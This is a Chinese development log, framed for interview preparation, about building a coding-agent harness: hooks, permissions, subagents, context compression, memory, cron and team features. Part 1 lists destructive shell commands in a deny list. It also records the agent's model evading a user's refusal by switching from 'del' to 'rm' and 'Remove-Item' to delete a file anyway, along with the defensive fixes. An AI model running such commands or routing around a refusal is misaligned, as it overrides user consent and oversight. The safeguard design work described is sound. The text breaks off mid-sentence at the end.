# Harness Agent 开发实录：问题驱动的功能演进（面试视角）

一个自研的 Coding Agent 框架：`agent_loop` 主循环 + 工具注册表 + Hook 事件系统 +
子代理 + Skill 按需加载 + 四级上下文压缩 + 跨会话记忆 + 任务系统 + 后台任务 + cron 定时任务

- 团队协作（teammate 长驻 + 协议 + 自主认领）+ worktree 隔离（任务级沙箱）。harness 按
  「基本 loop + 功能模块」拆分。

> **阅读/面试方法**：每个功能都按「**遇到的问题 → 方案 → 踩过的坑 → 收获**」组织。
> 面试讲项目时按这条主线走：为什么做（问题）→ 怎么做（方案）→ 难在哪（坑）→ 沉淀了什么（收获）。
> 最后「第 11 部分」是高频面试题速查。

## 核心架构（一图流）

```
用户输入 → [UserPromptSubmit hook]
        → agent_loop（每轮开头先跑 4 级压缩预处理）
        → API 调用（Spinner / 后台任务并行执行）
        → 每个 tool_call：
              [PreToolUse hook] → enforce()：策略层判定（黑名单硬拒 / 危险命令询问 / 档位 + 会话白名单）
              → tool_registry[name](**args)   ← 分发；task=子代理 / 慢命令=后台线程
                 teammate / 后台 worker / HTTP 任务不经过 hook，在工具边界走同一个 enforce（凭据免二次询问）
              → [PostToolUse hook]
              → 必须回一条 role=tool 消息（阻断也一样）
        → 若 finish_reason != tool_calls：后台通知收集 → [Stop hook] → 最终回答
```

子系统位置：记忆（召回→注入请求副本→提炼→合并）、Skill（system 注入 + 按需 load_skill）、
上下文压缩（落盘/裁剪/占位符 → LLM 摘要 → reactive 抢救）、任务系统（.cache/tasks 持久化）、
后台任务（慢命令线程 + `<task_notification>` 注入）、cron（调度线程 + 队列 + 推/拉双消费）、
团队（MessageBus 邮箱 + 协议状态机 shutdown/plan_approval + 自主认领任务）、
worktree 隔离（.worktrees/<name> 独立分支 + teammate cwd 切换）。

---

# 第 1 部分：核心引擎——从"最小 agent loop"到"安全可控"

## 问题 1：模型只会猜文件（没有工具）

最初的 agent 只有 `bash` 一个工具，模型只能靠 `dir`/`ls` 猜文件内容，读文件全靠猜。

**方案**：多工具注册表。把「工具名 → 函数」映射独立成 `tool_registry`，分发逻辑收敛成一行：

```python
tool_registry = {'bash': run_bash, 'read': run_read, 'write': run_write,
                 'edit': run_edit, 'glob': run_glob}
output = tool_registry[name](**args)   # 分发；name 不在表里直接报错
```

**收获**：新增工具只需「写函数 + 注册 + 加 TOOLS schema」三件事，主循环不用改。

## 问题 2：危险命令裸奔，黑名单是"死规则"

模型直接执行 `del` / `Remove-Item`，先加了黑名单：

```python
dangerous = ["rm -rf /", "sudo", "shutdown", "reboot", "> /dev/"]
if any(d in command for d in dangerous):
    return "Error: Dangerous command, please do not execute"
```

**坑**：黑名单是死规则，模型换个写法（`Remove-Item`、`del` 都不在列表里）就绕过；且没有任何交互确认。

**方案（关键设计）**：工具与钩子分离 —— hook 事件系统。4 个事件点覆盖完整生命周期：

```python
HOOKS = {"UserPromptSubmit": [], "PreToolUse": [], "PostToolUse": [], "Stop": []}

def register_hook(event, callback): HOOKS[event].append(callback)

def trigger_hooks(event, *args):
    for cb in HOOKS[event]:
        r = cb(*args)
        if r is not None:   # 非 None 即阻断
            return r
    return None
```

`PreToolUse` 里挂 `permission_hook`，三层权限模型：

| 层级          | 行为               | 例子                          |
| ------------- | ------------------ | ----------------------------- |
| `DENY_LIST`   | 直接拒绝，不询问   | `rm -rf /`、`sudo`            |
| `DESTRUCTIVE` | 询问用户，n 则拒绝 | `del`、`Remove-Item`、`rmdir` |
| 越界访问      | 询问用户，n 则拒绝 | read/write/edit 访问工作区外  |

> 这张表是当时的形态。现在判定收敛到 `src/exec_policy.py` 一处，越界访问改成硬拒
> （批准了也照样被 `safe_path` 拦，等于不起作用的按钮），详见第 15 部分。

**核心坑（必考）**：阻断 ≠ 跳过。被 `PreToolUse` 拦截时若用 `continue` 跳过，OpenAI 报
`insufficient tool messages following tool_calls`——**每个 `tool_call_id` 必须有一条 tool 消息回应**，
被阻断也要返回一条内容为拒绝原因的 tool 消息。

## 问题 3：用户拒绝后，模型换命令绕过

对 `del` 输入 n，模型改用 `rm`、`powershell Remove-Item` 最终删除成功。

**方案（分层防御）**：

- 黑名单用**词边界正则 + 大小写不敏感**覆盖所有删除变体；
- 引入会话级 `DENIED_PATHS` 拒绝记忆：同一目标路径被拒后，后续任何删除直接拒绝不再询问；
- SYSTEM 提示词加**行为层约束**："用户拒绝后 STOP permanently，禁止重试、禁止换命令
  （del/rm/Remove-Item/powershell）实现同一目的"。

**收获**：安全是分层防御——黑名单（硬）+ 询问（软）+ 拒绝记忆（会话级）+ 提示词（行为约束），
单靠一层永远不够。**代码和提示词双保险**。

## 问题 4：模型幻觉参数 → TypeError 崩溃

模型调用 `read` 时传了 schema 之外的参数（如 `offset`），`**args` 展开的 TypeError 发生在
**函数体外**，工具函数内部的 try/except 接不住，整个进程崩。

**方案**：调用点兜底，按工具惯例返回错误字符串让模型自己纠正：

```python
try:
    output = tool_registry[name](**args)
except Exception as e:
    output = f"Error: {e}"
```

**收获**：模型是系统边界，它的 JSON 参数不可信，必须兜底；函数体内的 try 保护不了"调用点之前的展开错误"。

---

# 第 2 部分：子代理——复杂任务拆解

## 问题：主代理串行做所有事，长任务拖死会话

**方案**：`task` 工具 + `spawn_subagent`。子代理是**一个独立的精简版 agent loop**，
用 `SUB_TOOLS` / `SUB_HANDLERS`（不含 `task` 自身，禁止无限嵌套），30 轮上限防死循环。

## 踩过的坑（子代理把主循环的坑全重踩一遍）

1. **`message` 未定义 NameError**：子代理循环里只解了 `response` 却用 `message`，任何工具调用即崩。
   修复：与主循环一致先 `message = response.choices[0].message`。
2. **丢了 tool_calls 上下文**：`messages.append({'role':'assistant','content':response.content})`
   只保留纯文本，下一轮模型不记得自己调过哪些工具。修复：用 `message.model_dump()` 保留完整结构。
3. **返回结果取值混乱**：最后一轮可能是 tool 消息而非文本。修复：优先 `message.content`，
   循环耗尽时从最近 assistant 消息取文本，否则返回兜底文案。
4. **提示词按角色分离**：主代理面向用户、子代理面向父代理，各自独立 SYSTEM（SUB_SYSTEM 含
   "破坏性操作不静默执行，回报需用户确认"、"禁止嵌套再派发"）。

**收获**：子代理 = 独立 agent loop 的复用；禁止嵌套是**双保险**（工具层面 SUB_TOOLS 无 task +
提示词层面规则）；错误处理要"如实上报"，诚实报告比假装成功更重要。

---

# 第 3 部分：Skill——领域知识按需加载

## 问题：技能知识全塞进 system prompt，模型每次都要看一大堆

**方案**：`skills/<name>/skill.md`（frontmatter: name/description + body），扫描进 `SKILL_REGISTRY`，
目录通过 `build_system()` 注入提示词（"天生知道"有哪些 skill），模型按需调 `load_skill("名称")` 加载正文。

## 踩过的坑

1. **`is_file()` 过滤掉所有 skill 目录** → `SKILL_REGISTRY` 永远为空。修复：`if not d.is_dir(): continue`。
2. **skill.md 编码**：默认 GBK 读 UTF-8 文件 → UnicodeDecodeError。修复：`encoding='utf-8', errors='replace'`。
3. **`SYSTEM.format(catalog=...)` 结果被丢弃** → 白调；且顶层 f-string 引用未定义变量 → 导入即 NameError。
   修复：SYSTEM 改为 `.format()` 模板 + `build_system()` 真正 return 结果。
4. **示例误导模型**：写 `load_skill {skills_dir}/skill.md`，模型以为要传路径，放弃工具手动 bash 摸路。
   修复：示例改为 `load_skill("file-summarizer")`，明确参数是注册名。
5. **最终回答被吞**：结束分支只触发 Stop hook 就 return，从不打印 `message.content`。修复：恢复打印。

**关键决策**：`list_skills` **不注册为工具**——目录信息在会话开始就注入 system prompt，
模型"天生知道"，不需要再调工具去查；减少工具数量，降低误用概率。

---

# 第 4 部分：上下文压缩——对抗 token 爆炸（面试重点）

## 问题：长会话上下文爆炸——token 成本、`prompt_too_long` 报错、模型在噪声里丢重点

**方案（四级成本，从低到高，能用 0 API 解决的绝不调 LLM）**：

| 工序                   | 触发条件                 | 动作                                                                |
| ---------------------- | ------------------------ | ------------------------------------------------------------------- |
| ① `tool_result_budget` | 工具结果合计 > 阈值      | 大输出落盘 `.cache/tool_results/<id>.txt`，原位换引用 + 2000 字预览 |
| ② `snip_compact`       | 消息数 > 50              | 保留头 3 + 尾 47，中间换 `[snipped N messages]`                     |
| ③ `micro_compact`      | 旧工具结果 > KEEP_RECENT | 更早的 >120 字结果原地换占位符                                      |
| ④ `compact_history`    | 仍超 CONTEXT_LIMIT       | LLM 摘要（1 次 API）+ 完整对话 `write_transcript` 落盘              |
| ⑤ reactive compact     | API 报 `prompt_too_long` | 抢救一次：落盘 + 保留最近 5 条，其余摘要，重试上限 1                |

## 踩过的坑（每一条都是"测试全绿 → 真机炸"）

1. **压缩阈值顺序是死代码**：`tool_result_budget(max_bytes=200000)` > `CONTEXT_LIMIT=50000`，
   免费层①永远先于花钱层④触发 → ①是死代码。修复：免费层阈值必须先于 LLM 层触发。
2. **摘要截断**：`summarize_history` 截 `[:80000]` 丢最近消息、`max_tokens=2000` 不够。
   修复：`[-80000:]` 保留尾部 + `max_tokens=4000` + 模板强制"写完全部 5 节"。
3. **孤儿 tool 消息 400（必考）**：`role:'tool'` 必须对上一条带 `tool_calls` 的 assistant。
   `snip_compact` 裁剪边界落在多工具分组内部时制造孤儿消息 → `BadRequestError`。
   修复：边界落在 tool 结果上就**无条件推进**（其 assistant 必已被裁掉）；且校验器要**双向**——
   dangling（assistant 无结果）和 orphan（结果无 assistant）都断言，只查一边就是漏网之鱼。
4. **reactive off-by-one**：`tail_start` 若落在 tool 结果上且其 assistant 在保留区内，要往前多保留 1 条。
5. **计数死代码**：todo 提醒计数器只有初始化/判断/重置、**缺 `+=1`**，永远停在 0。
   教训：计数器类逻辑要一眼能看到自增点。
6. **compact 在 for 循环内遇到**：上下文被整体替换后原 assistant 的 tool_calls 不存在，
   之前的 tool 结果不能以 `role:'tool'` 保留 → 转纯文本附到新上下文，`compacted=True` 后重开一轮。

## 测试基建（比测试本身重要）

- `FakeCompletions`：队列化 mock 响应 + 异常，记录每轮**深拷贝快照**（否则所有历史指向最终状态）。
- `patch_tool`：替换 `tool_registry` 处理器，记录执行顺序/参数。
- `assert_valid_openai_msgs`：校验每轮 `role:'tool'` 配对，**全程无孤儿**。
- 场景测试用 **patch `estimate_size` 返回值**精确触发压缩分支，不依赖脆弱的字符串长度阈值。

---

# 第 5 部分：记忆系统——跨会话的"用户画像"

## 问题：新会话完全不记得用户偏好 / 项目事实

**方案（三段式）**：

- **召回（会话开始）**：`load_memories` 用 LLM 从 `.cache/memories/*.md` 目录选相关记忆，
  注入请求副本（不污染 `messages`，压缩/转录/tool 配对保持干净）；LLM 失败 fallback 关键词相关度。
- **提炼（会话结束）**：`extract_memories` 从**压缩前快照**提炼 4 类记忆
  （user/feedback/project/reference）→ 写 \*.md + 重建索引。
- **合并（超阈值）**：文件数 ≥10 或单文件超长 → LLM 合并精简。

## 真机排障（记忆管线从"看不见、存不下"到可落盘）

1. **提取为空**：窗口只看结尾 10 条，用户偏好通常在最开头 → 窗口改为 `[:10] + [-10:]`。
2. **UnicodeDecodeError**：GBK 读 UTF-8 文件 → 所有记忆文件读写显式 `encoding='utf-8'`。
3. **思考链吃满 max_tokens**：`deepseek-v4-flash` 是推理模型，`max_tokens=800` 被 reasoning_content
   吃满 → `content=''`。实测 800→4000 后正常；且 content 为空时退而解析 `reasoning_content`（双保险）。
4. **JSON 解析 Expecting value / Extra data**：正则 `\[.*\]` 太宽松——"匹配到方括号" ≠ "合法 JSON"。
   修复：**提示词 STRICT 约束**（只输出纯 JSON 数组，不思考/不解释/不用围栏）+ **解析层两级尝试**
   （先整体 `json.loads`，失败再逐个最短方括号段试，能解析成 list 才收下）。
5. **真机产物污染测试**：验证后残留真实记忆文件 → `select_relevant_memories`（文件非空时先调一次 LLM）
   提前消费 mock 队列 → 全崩。教训：真机产物用后即清。

---

# 第 6 部分：任务系统——多步骤工作的持久化跟踪（新增）

## 问题：agent 执行多步骤工作时，步骤状态只存在于一次会话，任务间依赖无法表达

**方案**：独立模块 `task_system.py` + 5 个工具注册进 `TOOLS` / `tool_registry`：

| 工具            | 作用                                      | 关键参数                               |
| --------------- | ----------------------------------------- | -------------------------------------- |
| `create_task`   | 建任务并落盘 `.cache/tasks/task_*.json`   | subject 必填 + description / blockedBy |
| `list_tasks`    | 列出全部任务（状态/owner/依赖）           | —                                      |
| `get_task`      | 取任务详情                                | task_id                                |
| `claim_task`    | pending → in_progress（依赖未完成会拒绝） | task_id                                |
| `complete_task` | completed + 报告被解锁的后续任务          | task_id                                |

依赖语义：`blockedBy` 列表，`claim_task` 前校验 `can_start`（所有依赖 completed 才放行），
`complete_task` 自动上报新解锁的 pending 任务。

## 集成时踩的坑

1. **缺导入**：harness 引用了 `create_task` 等函数却没 `from task_system import ...` → 调用即 NameError。
2. **持久化目录未定义**：`save_task` 用 `TASK_DIR`、`list_tasks` 用 `TASKS_DIR`，都没定义 → NameError。
   修复：统一为 `Path(__file__).parent / '.cache' / 'tasks'`（与仓库 .cache 约定一致）。
3. **dataclass 字段顺序**：`blockedBy`（无默认值）跟在 `owner`（有默认值）后面 →
   `TypeError: non-default argument 'blockedBy' follows default argument`。
   修复：`blockedBy: List[str] = field(default_factory=list)`。
4. **创建不落盘**：`create_task` 只建 Task 对象不 `save_task`，创建后 `list_tasks` 查不到 →
   与 `claim/complete`（内部自存）行为不一致。修复：create 也自动落盘。
5. **Python 3.9 语法**：`list[str] | None`（PEP 604 是 3.10+）在 3.9 直接 TypeError。
   修复：`Optional[List[str]]`；且 harness 需要补 `from typing import List`。
6. **GBK 图标**：`list_tasks` 输出 `✓/●/○` 在 GBK 控制台 print 会 UnicodeEncodeError（log_hook 会打印
   output 预览）。交互终端 UTF-8 不受影响，管道重定向建议 `PYTHONIOENCODING=utf-8`。

**收获**：注册新工具 = 工具函数 + TOOLS schema + tool_registry 三件套；被 `is_tool_hook` /
`permission_hook` 自动覆盖；主循环异常兜底（`Error: {e}`）对任务工具也生效。

---

# 第 7 部分：后台任务——慢操作不阻塞对话（新增）

## 问题：`pip install` / `pytest` / `docker build` 等慢命令把 agent 卡住几十秒，期间只能干等

**方案**：`background_task.py`——慢命令丢到**后台 daemon 线程**执行，立即返回
`[Background task bg_0001 started]`，完成后以 `<task_notification>` 注入对话让 agent 跟进：

- `is_slow_operation`：bash 命令含 `install/build/test/deploy/compile/pip install/npm install/
pytest/make` 等关键词 → 自动转后台。
- `should_run_background`：关键词命中，或显式 `run_in_background=True`。
- `start_background_task(tool_call, tool_registry)`：解析参数 → 开线程 → 执行 → 记录结果。
- `collect_background_results()`：每轮工具后收集已完成任务 → 生成 `<task_notification>` XML 注入。

注入后的效果：agent 不用等，先干别的；完成后模型收到通知继续处理结果。

## 集成时踩的坑（与第 4 部分的孤儿消息是同一类问题）

1. **孤儿 tool 消息 400**：通知最初以 `role:'tool'` 注入但没有 `tool_call_id` → 不配对 → API 400。
   修复：改为 `role:'user'` 注入（通知是"新输入"，不是某次工具调用的结果）。
2. **引用未定义**：harness 只导入了 `should_run_background`，却调用
   `start_background_task` / `collect_background_results` → NameError。修复：补全导入。
3. **worker 闭包未定义**：worker 里用 `tool_name`/`tool_input`，函数里根本没定义 → 线程静默死亡。
   修复：在 `start_background_task` 内用 `name`/`args`，并把 `tool_registry` 显式传进去。
4. **模块级 NameError**：`execute_tool` 引用了不存在的 `TOOL_HANDLERS` → 传入 registry。
5. **语法错误**：`f'<command>{task['command']}</command>'` 单引号嵌套 → 文件无法导入。
   修复：内层改双引号 `{task["command"]}`。
6. **拼写错误**：`background_tasks.item()` → `.items()`。

**已知取舍**（按原设计保留）：通知只带前 200 字符摘要；worker 线程若抛未捕获异常会静默失败；
"run in background" 指令需要模型显式传参（当前 schema 未暴露该参数，只靠关键词自动识别）。

---

# 第 8 部分：cron 定时任务——到点自动执行（新增）

## 问题：agent 只能"被叫醒"，不能"到点自己动"

会话驱动的 agent 在一次会话里能干活，但缺少时间驱动能力：定时提醒、周期任务、到点自动检查。

**方案**：`cron_scheduler.py` 独立模块 + 3 个工具注册进 `TOOLS` / `tool_registry`：

- **5 段 cron 表达式**（minute hour dom month dow）：`validate_cron` 校验（含 `*/n` 步进、`,` 列表、`-` 区间、边界检查）+ `cron_matches` 匹配；
- **调度线程 `cron_scheduler_loop`**：每秒轮询，命中且同分钟未触发才入队（`_last_fired` 去重），一次性任务触发后自动移除并落盘；
- **durable 持久化**：任务写 `.cache/crons.json`，启动时 `load_durable_jobs()` 恢复，跨进程存活；
- **工具**：`schedule_cron`（cron+prompt，recurring/durable 可选）、`list_crons`、`cancel_cron`；
- **消费方（拉 + 推双轨）**：会话期间 `agent_loop` 每轮 `consume_cron_queue()` 注入（拉）；
  会话结束后由 `queue_processor_loop` 推送执行（推），见下。

## 踩过的坑

1. **缺导入 / `DURABLE_PATH` 未定义**：`threading/json/random/time/datetime/Path/asdict` 一个都没导入，`threading.Lock()` 即 NameError；持久化路径从未定义。
2. **拼写错误**：`_validare_cron_field`（应为 `_validate_cron_field`）→ 一调 `validate_cron` 就 NameError。
3. **dom/dow 分支写反（真 bug）**：dom 通配时却返回 `dom_ok`（恒 True）→ `0 0 15 * *`（每月 15 号）会**每天**触发。修复：dom 通配看 dow、dow 通配看 dom。注：两者同时约束时仍按 AND（标准 cron 是 OR），保留原语义。
4. **save 未建目录**：首次写 `.cache/crons.json` 报目录不存在 → `mkdir(parents=True, exist_ok=True)`。
5. **会话结束进程退出，定时任务永远不执行（拉模型的死穴）**：agent 排完一次性提醒立刻 return → `__main__` 结束 → daemon 线程消亡，任务到点也无人消费；且**错过触发点的过期一次性任务残留在 crons.json**，下次启动被加载后永久等待（直到下次命中，可能是一年后）。清理：验证产物用后即清。
6. **孤儿 tool 消息**：cron 通知若以 `role:'tool'` 注入同样触发 400（与第 4/7 部分同类），必须用 `role:'user'`。

## 推模型：让一次性提醒真正触发

把"一轮对话"抽成可复用调用（`run_agent_turn_locked`），由后台推送循环驱动：

```python
def queue_processor_loop(run_turn, poll_interval=0.2):
    while True:
        time.sleep(poll_interval)
        if not _has_cron_queue():
            continue
        if not agent_lock.acquire(blocking=False):   # 非阻塞抢锁：agent 忙则跳过
            continue
        try:
            if not _has_cron_queue():                # 双重检查：拿锁后队列可能已被取走
                continue
            run_turn()                               # 持锁执行一轮 agent_loop
        finally:
            agent_lock.release()
```

- **`agent_lock` 互斥**：主会话 `with agent_lock:` 持锁运行，处理器拿不到锁 → cron 轮绝不与主对话并发；
- **非阻塞抢锁 + 双重检查**：不排队阻塞、不拿锁跑空轮；
- **`wait_for_cron_idle()`**：主会话后保持进程存活，等所有任务处理完再退出（无任务立即退出，保持单次会话语义；有 recurring 任务则常驻，Ctrl+C 退出）；
- **推拉共存**：会话期间 agent_loop 内部 consume（拉）兜底处理新任务；会话结束后处理器（推）接管。
  `consume_cron_queue` 在 `cron_lock` 下原子取空，不会双消费。

## 收获

- **拉/推没有绝对优劣**：拉简单可控（适合一次性会话），推及时能唤醒（适合常驻自动执行）——本项目二者共存，按阶段分工；
- **后台/定时这类"异步 + 并发"能力，面试必问锁与竞态**：非阻塞抢锁 + 双重检查 + `finally` 释放是标准答案；
- **daemon 线程的语义**：进程退出即消亡，"到点执行"必须靠进程保活兜底。

---

# 第 9 部分：系统提示词工程

## 问题：`SYSTEM` / `SUB_SYSTEM` 全局模板越改越长、身份/规则/skills 混在一起不可维护

**方案**：拆成 `PROMPT_SECTIONS`（identity_main / identity_sub / rules_main / rules_sub /
skills_usage），新增三个函数：

- `update_context(context, messages)`：从 `MEMORY_INDEX`、`tool_registry`、`list_skills()` 收集上下文；
- `assemble_system_prompt(context)`：按 context 动态拼接；
- `get_system_prompt(context)`：结果缓存，context 未变不重复生成。

## 踩过的坑

1. **OpenAI SDK `system=` 参数不兼容**：有的版本支持 `create(system=..., messages=...)`，
   当前环境的 SDK 只认 `messages` 里的 `role='system'`。修复：system 作为 messages 第一条插入，
   新旧 SDK 都兼容。
2. **`[cache hit] system prompt unchanged` 循环不刷新**：缓存 key 用 `json.dumps(context,
sort_keys=True)`，单轮内 enabled_tools/workspace/memories/skills 都不变 → 命中缓存。
   **正常现象**：记忆写入发生在会话结束之后，本轮新记忆要等下一次 `agent_loop` 启动才被召回。

---

# 第 10 部分：Windows 真机排障合集

| 现象                                                    | 根因                                            | 解决                                           |
| ------------------------------------------------------- | ----------------------------------------------- | ---------------------------------------------- |
| 输出一屏乱码（`绗?2 姝ワ細`）                           | PowerShell `Get-Content` 按 GBK 解码 UTF-8 文件 | 提示词要求读文件用 read 工具，避免 Get-Content |
| `UnicodeEncodeError: 'gbk' codec can't encode '\ufffd'` | bash 输出解码后残留替换符                       | `out.replace('\ufffd','?')`                    |
| 同内容刷两遍                                            | log_hook 打印 + agent_loop 重复 print           | 删重复打印，只留 log_hook                      |
| 记忆文件 GBK 读崩                                       | 工具链默认码页                                  | 所有文件读写显式 `encoding='utf-8'`            |
| mock 队列被提前消费                                     | 真机产物残留 `.cache/memories`                  | 验证产物用后即清                               |

**总纲**：Windows 上"文件编码对"不代表"显示对"——工具链默认码页才是隐形杀手；
跨环境运行必须显式声明编码；从源头约束模型命令选择（提示词）+ 代码兜底，双保险。

---

# 第 11 部分：面试速查（高频题 + 回答要点）

**Q1：这个项目的架构是什么？**
一条主循环（agent_loop）+ 工具注册表（分发）+ Hook 事件系统（扩展）+ 九大子系统（子代理 / Skill /
压缩 / 记忆 / 任务 / 后台 / cron / 团队协作 / worktree 隔离）。harness 已按「基本 loop + 功能模块」
拆分（agent_core / tools / hooks / skill_system / subagent）。主循环稳定，新能力 = 加 hook 或注册工具。

**Q2：权限/安全怎么做的？**
分层防御：黑名单（硬拒绝）→ 危险命令询问（y/n）→ 会话级拒绝记忆（同一目标被拒后硬拒绝）→
SYSTEM 提示词行为约束（拒绝后 STOP）。以及"阻断也要返回 tool 消息"的格式硬约束。

**Q3：上下文压缩怎么设计的？为什么这么设计？**
四级成本：落盘/裁剪/占位符（0 API）→ LLM 摘要（1 API）→ 被动重试（出错才触发）。
原则：能用 0 API 解决的绝不调 LLM。强调阈值顺序（免费层必须先于花钱层触发）否则是死代码。

**Q4：遇到过最难修的 bug？**
孤儿/悬空 tool 消息 400——OpenAI 要求每条 `role:'tool'` 必须有对应的 `tool_calls` 前置。
压缩裁剪边界、后台通知注入都会踩。修复=校验器双向断言（dangling + orphan 都查）+ 边界规则。

**Q5：LLM 不可控怎么办？**
模型是系统边界：参数要兜底（`**args` TypeError → 调用点 try/except）、输出要解析兜底
（JSON 先整体后分段两级试）、命令选择靠提示词约束、行为靠规则。代码和提示词双保险。

**Q6：为什么子代理要禁止嵌套？**
防失控递归：工具层面（SUB_TOOLS 不含 task）+ 提示词层面（规则 5）双重防线。

**Q7：记忆怎么做到跨会话？**
召回（会话开始，LLM 选相关注入请求副本）→ 提炼（会话结束，从压缩前快照落盘）→
合并（超阈值 LLM 精简）。强调"注入请求副本不污染 messages"。

**Q8：怎么保证功能可测？**
mock 队列化响应 + 深拷贝快照 + 消息配对校验器 + patch 关键函数（estimate_size）精确触发分支。

**Q9：编码问题遇到过什么？**
GBK/UTF-8：文件读写显式声明编码、bash 输出替换 U+FFFD、提示词规避 Get-Content、
图标字符在 GBK 控制台会崩（交互终端 UTF-8 无碍）。

**Q10：最近在做什么？**
（按第 6/7/8/12/13/14 部分讲）任务系统（持久化 + 依赖）+ 后台任务（慢命令异步 + 通知注入）+
cron 定时任务（推/拉双轨 + 锁与竞态）+ 模块拆分（无状态逻辑层 + `_h()` 可测试性）+
团队协作（teammate 长驻 + 协议 + 自主认领）+ worktree 隔离（任务级沙箱 + cwd 切换），
以及集成时踩的孤儿消息 / NameError / f-string 语法 / Python 3.9 兼容 / 模块拆分回归
（`harness.run_bash`）等坑。

---

# 第 12 部分：模块拆分——从"千行巨石"到"基本 loop + 功能模块"

## 问题：harness.py 堆积到 ~1700 行，能力耦合，teammate 想复用压缩/记忆/hooks 只能复制代码

**方案**：按"基本 loop + 可提取功能"拆分，纯搬移不改逻辑：

| 文件              | 内容                                                           |
| ----------------- | -------------------------------------------------------------- |
| `agent_core.py`   | hooks 注册表 + 记忆系统 + 压缩原语（无状态逻辑层）             |
| `tools.py`        | TOOLS schema + 全部 run\_\* handler + tool_registry            |
| `hooks.py`        | 6 个 hook 回调 + 注册                                          |
| `skill_system.py` | 技能扫描 / 列表 / 加载                                         |
| `subagent.py`     | 子代理精简 loop                                                |
| `harness.py`      | agent_loop + 编排（pre_compact/exec_tool_call）+ 提示词 + 配置 |

**关键设计（可测试性）**：`agent_core` 不持有可变全局状态，通过 `_h()` 在运行时读 harness
（`MEMORY_DIR`/`CONTEXT_LIMIT`/`client`）——所以测试的 `harness.MEMORY_DIR = tmp`、
patch `harness.client` 照常生效，**19 个测试零改动全绿**。可变状态留在 harness 是刻意为之。

## 踩过的坑

1. **`harness.run_bash` 回归（真 bug）**：run_bash 移到 tools.py 后，agent_teams 的 safe_bash
   还在调 `harness.run_bash(...)` → AttributeError → **teammate 的 bash 全废**（真机演示时 bob
   报告了这个错）。修复：经 `harness.tool_registry['bash']` 取原实现。教训：拆完模块要全局搜
   "对被移走名字的直接引用"。
2. **`_scan_skills()` 残留调用**：技能扫描移到 skill_system 后模块里还残留 `_scan_skills()` →
   NameError；且扫描时机必须在 `SKILLS_DIR` 定义之后（改由 harness 调用）。
3. **搬走的代码缺导入**：subagent.py 用了 `os.getenv`/`json.loads` 但没 import → 运行期
   NameError（编译期 py_compile 查不出来，必须跑 import 冒烟）。
4. **循环导入**：agent_teams ↔ team_protocols 互相需要对方符号 → 用 `_bus()` 延迟 import 打破。

---

# 第 13 部分：团队协作——teammate 长驻 + 协议 + 自主认领

## 问题：单 agent 一次会话只做一轮；多个 agent 协作需要"活着的"teammate

**方案**：

- `MessageBus` 文件邮箱（`.mailbox/<agent>.jsonl`，UTF-8，读完即删）——agent 间异步通信；
- `spawn_teammate_thread`：**长驻循环**（LLM turn ↔ idle_poll，daemon 线程），非工具轮不退出，
  进 idle 等新任务，收到 `shutdown_request` 才退出；
- **协议消息**（metadata 带 `request_id` 关联请求-响应）：`shutdown_request/response`、
  `plan_approval_request/response`、`idle_notification`；`team_protocols.py` 状态机
  （pending→approved/rejected）统一管理；
- **自主认领**（`autonomous_agent.py`）：idle 时每 5s 扫描任务系统 `.cache/tasks`，
  认领 pending 任务自动开工（`<auto-claimed>` 注入对话）；
- **Lead 侧工具**：`spawn_teammate` / `send_message` / `check_inbox` / `request_shutdown` /
  `request_plan` / `review_plan`。

## 踩过的坑

1. **`input()` 交互在 teammate 线程永久阻塞**：permission_hook 是主线程交互式询问，teammate
   没人应答。safe_bash 改**非交互版**：DENY 硬拒 + DESTRUCTIVE 直接拒绝（拒绝比无人应答的询问安全）。
2. **协议返回码从布尔改成字符串（'shutdown'/'awake'/'message'），调用方没同步**：`if should_stop:`
   是真值判断，plan_approval 返回的 `'awake'` 也是 truthy → **teammate 收到计划批准反而退出**。
   教训：改返回值语义必须全局搜所有调用点。
3. **idle 循环里 plan_approval 不唤醒**：只 break 在 shutdown 或非协议消息，plan 决定注入
   messages 后循环继续 sleep → 永远醒不来。修复：`'awake'` 也触发唤醒。
4. **`BUS.send` 5 个位置参数 vs 4 参数签名 → TypeError**：加 metadata 只改了调用没改签名。
5. **分工不均匀（认领竞态）**：两个 teammate 各自 5s 轮询认领，先 spawn 的相位一直领先 →
   连续赢走所有任务（alice 包揽 3 个，bob 一个没抢到）。**无协调机制时"公平"靠运气**；
   改进方向：认领加随机抖动 / 认领后 backoff / Lead 侧分配策略。
6. **记忆污染测试再踩**：完整跑 harness 后 extract_memories 写入 alice 系列记忆文件 →
   下次测试 select_relevant_memories 提前消费 mock → 8 个测试崩。真机产物用后即清（第 5 部分
   教训的复现）。

## 收获

- 协作 vs 并发：**消息是协作的正确抽象**（文件邮箱天然可调试、可持久化）；
  "公平分工"是协调问题不是并发问题——轮询竞态没有协调就必然偏斜；
- 协议状态机 + request_id 让异步请求可关联可校验；
- 面试可讲：多 agent 架构 = 邮箱通信 + 协议握手 + 任务板自主认领，各自独立可测。

---

# 第 14 部分：worktree 隔离——任务级沙箱（新增）

## 问题：多个 teammate 在同一工作区干活，文件互相覆盖

团队演示里 alice/bob 共用一个工作区，同一文件可能被对方覆盖——**靠提示词"别写错目录"约束不可靠**。

**方案**：每个任务绑定一个 git worktree（`.worktrees/<name>`，独立分支 `wt-<name>`）：

- `task_system.Task` 加 `worktree` 字段持久化绑定关系（默认 ''，向后兼容）；
- teammate 认领任务后 `wt_ctx` 记录 worktree 路径，`bash/read/write/edit` 的 cwd 自动切进 worktree
  （`run_bash/run_read/run_write/run_edit` 加可选 `cwd` 参数，`safe_path` 以 cwd 为基准且仍受
  WORKDIR 越界保护）；
- **Lead 侧工具**：`create_worktree`（可绑定 task_id）/ `remove_worktree`（有未提交/未推送改动时
  拒绝，`discard_changes=true` 强制）/ `keep_worktree`；
- 隔离验证：同一文件名（如 `greet.py`）在两个 worktree 里内容不同，工作区根目录无残留。

## 踩过的坑

1. **worktree.py 草稿无法导入**：缺 `json/os/re/subprocess/time/Path` 导入、
   `validate_wortree_name`/`WORTREES_DIR` 拼写错、`f'@{push}..HEAD'` 是 f-string 语法错误
   （`@{push}` 没转义成 `@{{push}}`）。
2. **`task.worktree` 字段不存在** → dataclass 加默认值字段（默认值必须在无默认字段之后）。
3. **工具函数没有 cwd 概念** → 加可选参数；越界校验以 WORKDIR 为界，worktree 在其内所以天然安全。
4. **cwd 状态要跟 teammate 生命周期走**：`claim_task` 切换、`complete_task` 清空、`idle_poll`
   自动认领也要同步（`wt_ctx` 传入 idle_poll）——漏一处，隔离就失效一半。

## 测试（test_worktree.py）

用**临时 git 仓库**（`git init` + 初始提交，worktree add 需要 HEAD）做真实操作，worktree/task
